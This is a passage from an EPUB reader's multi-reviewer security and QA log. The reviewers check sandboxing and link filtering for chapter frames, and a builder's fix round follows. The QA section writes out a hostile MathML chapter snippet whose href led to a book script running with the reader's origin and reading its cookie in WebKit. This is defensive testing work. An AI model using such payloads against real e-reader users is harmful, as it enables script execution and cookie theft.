clean. Probes on this tree: smoke, link, place, trigger, taps, landing, reduced, pdfscroll, broken, csp: all PASS.

Gate: APPROVED r4 @985faa5d — security-brief

Static review only (no browser, no git), of read.js and this plan as the worktree holds them.

r3 W1 (book-supplied template / declarative shadow root): FIXED. Every element whose lowered localName is template becomes a new,
attribute-less, empty template (read.js:146-150), so no shadowrootmode survives and no content the guard skipped reaches the frame.
r3 W2 (SVG animation of link targets): FIXED. animate / set / animateMotion / animateTransform / animateColor / discard are emptied
the same way, matched by lowered localName (case-sensitive SVG names are handled). ping is removed (read.js:169).
Backstop (read.js:822-833): a capture-phase click listener on the chapter document finds any a/area on composedPath and cancels
the default action. In-book links still route through epub.js's handler -> the display() wrapper -> resolveBookLink (spine only).
Your controls show it holds every shape on its own.

The asked-about paths, checked:
- Keyboard activation (Enter on a focused HTML or SVG link) runs the link's activation through a click event, so the backstop sees it.
- auxclick / middle-click / target=_blank open a new browsing context, which the sandbox blocks (no allow-popups).
- Forms: blocked by the sandbox (no allow-forms) and form-action 'none'. Meta refresh: neutralized.
- Links created later: no book script can run (the policy is first in head), and nothing animates an href any more, so the only links
  are the parsed ones, already filtered.
- Non-chapter documents: link taps and Contents entries both go through resolveBookLink, which returns only spine entries
  (read.js:806-811, 953-956), and epub.js's own display() of a non-spine href fails with "No Section Found" (verified at source in r1).
  No view is ever pointed at an asset.
- noscript / object / embed -> span (read.js:151-154): the new span carries none of the original attributes (data, type, src all
  dropped), embed has no children, and the moved children are filtered by the attribute pass that runs after the swap. Fallback
  content now renders, as it did in v1.401's frame. Nothing re-exposed.

NOTE (defense in depth, not blocking): the backstop attaches in rendition.hooks.content, after the frame's content loads, so a tap in
the first moments before it attaches is covered by the markup layer alone. Your backstop-only control shows the layers are
independent, so one layer always holds.
NOTE (suspicion, low): a native drag of a link dropped back onto the page is a navigation with no click event. No dragstart handling
exists in page-turn.js / read.js. The link's URL has already been filtered to http(s), mailto or a relative path (a relative path
resolves to the app's own pages, not a book file), so the blob: case cannot reach it this way. Optional: cancel dragstart on links.
Still open from r1 (ROADMAP Planned): no default-src (beacons on open).

No CRITICAL or WARNING remains on the P9 surface.

Gate: CHANGES r4 @985faa5d — qa

- r3 CRITICAL (an SVG <set>/<animate> retargets a link to a book's blob: page): FIXED. qa/blobnav.js (sandbox
  /tmp/qa-v1402-r4), with a real mouse click: in WebKit and in Chromium the animation is gone (an empty template), the link
  has no href, nothing ran, and every frame stays about:srcdoc.
- r3 NOTE (a failed or aborted open never destroyed the book): FIXED (book.destroy() on that path). The damaged book still
  shows its error (qa/broken.js, WebKit: "Could not open this book / The file may be damaged or not a valid EPUB.").
- CRITICAL (NEW, verified): a MathML `href` navigates the chapter frame to the book's own blob: page in WebKit, and the
  page's script runs with the reader's origin. Chapter: `<math><mrow id="sa" href="p.html"><mi>Tap</mi><mi>here</mi></mrow>
  </math>`, where p.html is a manifest item declared image/png (blob type text/html from the name) holding a script.
  epub.js's substitute writes `href="blob:http://<app>/<uuid>"` onto the mrow. Neither layer sees it: the markup filter
  only checks href on a/area, and the click backstop only cancels a/area found through composedPath. One real click in
  WebKit: pwned ["blob-nav"], the reader's cookie read, frame location blob:, text/html, 1 script. Chromium: no MathML
  links, so nothing happens. Fix: apply the link-scheme rule to href / xlink:href on EVERY element (or drop href on
  every non-a/area element). The backstop should cancel when any element on the composed path carries href or
  xlink:href, not only a/area. Add the shape to `csp both` with the filter-disabled control.
- Not reached (the CRITICAL above ended the round): Enter on a focused link (it fires click, which the backstop sees, from
  reasoning, not run), link drag-and-drop, middle click / auxclick, <area> focus+Enter, a link inside <foreignObject>.
  Long-press and selection-adjacent clicks are device checks.
Checked, no finding: in-book links (`link both` PASS: Chromium 1:0 -> 2:0 "Part three", WebKit the same); the
noscript/object/embed span swap (a fresh span, children kept, attributes dropped).
Measured (Node 22.23.1): eslint 0 errors / 6 warnings (common.js, already there); lint:ui OK; overlay-containment clean (0
violations); the 5 targeted unit files: 113 tests, 113 pass, 0 fail.

Gate: CHANGES r4 @985faa5d — adversary

Delta on a202ab11..985faa5d. Mutants ran in a /tmp `git archive 985faa5d` sandbox (worktree untouched); Node 22.23.1; Playwright
Chromium + WebKit; one browser probe at a time. The 5 targeted unit files: 113/113 pass. `page-turn-probe.js csp both`: PASS (8 shapes).

r3 findings:
- WARNING (noscript/object blocks vanish): FIXED for blocks in the BODY. With blocks-e2e.js, the frame blocks are
  `H|q0|n1|n2|fallback|q1|q2`, q2 = 6, server = 6, in Chromium AND WebKit (v1.401: identical). cfishift.js still opens a v1.401
  place with q27 on the page.
- NOTE (unbound guards): FIXED. Q17, the abort leg (R8) and fail-closed (R6) now die by name. The new guards also die by name: book
  template / animations emptied, ping, backstop preventDefault, backstop composedPath, abort destroys the book, http-equiv meta.
  One survivor: S7 (the backstop matches `a` only, not `area`). It is a NOTE, because the static filter still strips a non-http href
  from `<area>`, and animations are emptied.

NEW, introduced by the span swap (r4):
- WARNING (P8: every place in a chapter moves, and blocks re-nest): `<span>` is not a neutral stand-in for these elements, because the
  frame's HTML parser treats a span differently from a noscript in <head> or from an <object> (a scope boundary).
  Measured in the real reader (renest.js), v1.401 (857a2c3f) against 985faa5d, the same result in Chromium AND WebKit:
  - (A) A chapter with `<noscript><link .../></noscript>` in its <head>:
    - v1.401 body children: `[h1,p,p]`.
    - 985faa5d body children: `[span,link,meta,meta,meta,meta,meta,meta,meta,h1,p,p]`. The span closes <head>, and every later head
      child (the book's link, epub.js's injected metas) moves into <body>.
    - Every body CFI saved by v1.401 for that chapter now points 9 elements early, and the reader then saves the wrong place over
      it (the r2 N-W1 class again, for the whole chapter).
  - (B) `<p>t<object data="a.mp3" type="audio/mpeg"><p>fb</p></object>after</p>`:
    - v1.401 body `[h1,p,p]`, frame blocks `B|tfbaft|fb|q1` (4 = the server's 4).
    - 985faa5d body `[h1,p,p,p,p]`, blocks `B|t|fb||q1` (5 against the server's 4).
    - The inner <p> closes the outer one once the object is a span, so the CFIs and blockIndex after it shift.
  - jsdom shows the same re-nesting for an object holding li, dt, h3, a or a table inside p / li / dd / a / h2.
  - Fix: keep each element's own NAME so the frame parses it exactly as v1.401 did.
    - `<object>` / `<embed>`: keep the tag and strip the attributes that load something (data, src, type, codebase, classid,
      archive). The policy's object-src 'none' blocks a load anyway.
    - `<noscript>` in <body>: a span is equivalent there (v1.401's scripts-off parser treated it as an ordinary element).
    - `<noscript>` in <head>: use an empty <template>, which is allowed in head. Its children (link/style/meta) do not count toward
      the body's CFIs or the server's blocks.
  - Add tests for the frame's body element-shape and block count against the v1.401 parse, for these two shapes.

Not verified by me (stated plainly): I did not build browser cases against the navigation backstop (keyboard activation, auxclick,
drag-and-drop, links inside foreignObject). By reading the code: the capture listener runs on every click that reaches the chapter
document, keyboard activation of a link fires a click, and popups (middle and modifier clicks) are blocked by the sandbox. Contents
entries and in-book links that name a non-chapter file resolve to null (resolveBookLink, spine only) and do not move the reader;
Q16 binds that. The drag-and-drop link-drop navigation is a SUSPICION only (low; the page-turn engine owns drags).

### Fix round r4 -> r5 (builder, 2026-11-04)

Reviewed sha 985faa5d (Dean approved round 4). security-brief APPROVED r4; every r3 finding confirmed fixed by qa and the adversary.
New r4 findings, answered in the commit that carries this section:

- **qa CRITICAL (confirmed in WebKit): a MathML `<mrow href>` to the book's own page ran its code** - neither layer listed MathML.
  The class is answered without a list of link kinds: (1) the **backstop** now cancels the default action of EVERY click in a chapter
  (the one exception: a `<details>` summary's open / close when no link is on the path), and a dragged link can never start or drop
  in a chapter; (2) the **markup** applies the scheme rule to `href` / `xlink:href` on EVERY element except the resource loaders
  (`link`, SVG `image`, `use`, gradients, patterns, filters and the rest of that list keep epub.js's blob: URLs). Bound: the backstop
  test (an SVG link, a shadow-root link, a MathML href, a summary kept, a drag refused) and "an href that navigates on ANY element
  (MathML too) keeps only web / mail / relative; resource hrefs keep blob:". `csp both` with the MathML shape: 9 hostile chapters, book
  code that ran `[]`, 0 frames navigated, Chromium and WebKit. Controls: the backstop ONLY (markup layers off) - `[]` and 0 again;
  neither layer - Chromium 26 frames navigated, WebKit 46 navigated and the book's page ran (`["blob-page" x8]`).
- **adversary WARNING: the r3 `<span>` swap re-nested chapters** (a `<noscript>` in `<head>` closed the head early; an `<object>` inside a
  `<p>` stopped scoping its paragraphs). An `<object>` / `<embed>` now keeps its own tag with every load attribute removed (data, src,
  type, codebase, classid, archive, code, object; the policy's `object-src 'none'` blocks a load anyway, and its fallback shows as in
  v1.401); a `<noscript>` in `<body>` is a `<span>` keeping its children (the scripts-off parser's ordinary element), a `<noscript>` in
  `<head>` an empty `<template>`. Bound: "the frame re-nests the chapter exactly as v1.401 did (a noscript in <head>, an object inside
  a <p>)" - body elements in order, blocks and head counts against v1.401's own parse of the same chapter, three shapes.
- **adversary NOTE S7 (the backstop matched only `a`)**: moot, every click is cancelled now.

Mutants (restored byte-identical each): noscript in head as a span, object loads kept, object as a span (the r3 swap), the href rule
on a / area only, the backstop on links only, drag allowed, the summary blocked: 7 of 7 killed by name. Targeted units (six files):
`# pass 126`, `# fail 0`. lint:ui OK; overlay census clean. Probes on this tree: smoke, link (in-book links still jump), place,
trigger, taps, landing (8/8 at 0 px), reduced, pdfscroll, broken, csp: all PASS.
